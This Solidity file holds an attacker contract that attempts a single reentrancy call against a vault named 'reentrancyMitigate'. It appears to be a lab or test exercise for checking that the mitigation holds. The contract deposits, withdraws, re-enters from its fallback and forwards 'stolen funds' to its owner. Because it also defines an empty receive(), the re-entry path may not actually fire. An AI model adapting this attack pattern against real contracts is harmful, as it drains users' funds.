// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./reentrancyMitigate.sol";

contract reentrancyExploitMitigate {
    reentrancyMitigate public assetVault;
    address public owner;
    uint256 public attackCount;

    constructor(address _assetVaultAddress) {
        assetVault = reentrancyMitigate(_assetVaultAddress);
        owner = msg.sender;
    }

    // Function to receive ETH
    receive() external payable {}

    // Fallback function to receive ETH and attempt reentrancy
    fallback() external payable {
        if (attackCount < 1) {
            // Limit to one reentrancy attempt
            attackCount++;
            assetVault.exit(0.5 ether);
        }
    }

    // Function to initiate the attack
    function attack() external payable {
        require(msg.value >= 0.5 ether, "Min deposit 0.5 ETH");
        assetVault.enter{value: msg.value}();
        assetVault.exit(0.5 ether);
    }

    // Function to withdraw stolen funds
    function withdraw() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}
